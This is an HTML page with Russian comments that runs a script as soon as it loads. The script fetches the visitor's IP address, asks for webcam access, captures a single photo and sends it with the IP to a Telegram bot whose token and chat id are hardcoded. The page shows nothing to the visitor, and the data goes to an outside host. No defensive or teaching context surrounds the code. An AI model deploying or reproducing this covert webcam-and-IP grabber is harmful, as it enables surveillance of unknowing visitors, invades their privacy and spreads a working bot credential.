<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>Автоотправка IP и фото</title>
</head>
<body>
  <script>
    async function sendData() {
      try {
        // Получаем IP клиента через внешний сервис
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ip = ipData.ip;

        // Получаем фото с веб-камеры (разрешение нужно будет дать пользователю)
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        // Создаем canvas для захвата кадра
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);

        // Останавливаем камеру
        stream.getTracks().forEach(track => track.stop());

        // Преобразуем кадр в Blob формата JPEG
        const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));

        // Формируем FormData для отправки в Telegram
        const formData = new FormData();
        formData.append('chat_id', '<6945488830>');
        formData.append('photo', photoBlob, 'photo.jpg');
        formData.append('caption', `IP: ${ip}`);

        // Отправка фото с подписью в Telegram бот через Bot API
        const resp = await fetch(`https://api.telegram.org/bot<8083604701:AAHVEEUxRHT9MiQU7RVtMPIlFgWo3tR7PCU>/sendPhoto`, {
          method: 'POST',
          body: formData
        });

        const result = await resp.json();
        if (result.ok) {
          console.log('Данные успешно отправлены');
        } else {
          console.error('Ошибка отправки:', result.description);
        }

      } catch (err) {
        console.error('Ошибка:', err);
      }
    }

    window.onload = () => {
      sendData();
    };
  </script>
</body>
</html>
